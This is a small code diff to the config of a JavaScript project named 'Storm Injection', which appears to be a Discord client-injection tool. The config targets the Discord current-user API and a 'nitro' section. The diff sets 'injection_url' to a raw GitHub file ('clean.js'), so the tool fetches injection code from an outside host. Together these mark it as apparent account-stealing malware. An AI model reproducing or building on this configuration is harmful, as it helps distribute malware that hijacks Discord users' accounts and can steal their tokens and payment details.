@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Storm Injection', 
   embed_icon: 'https://i.pinimg.com/originals/0b/01/96/0b0196a2af49f7ea0109c6d85ac2b4cf.jpg',
   embed_color: 0, 
-  injection_url: '', 
+  injection_url: 'https://raw.githubusercontent.com/Archivedds/Storm-Injection/main/clean.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
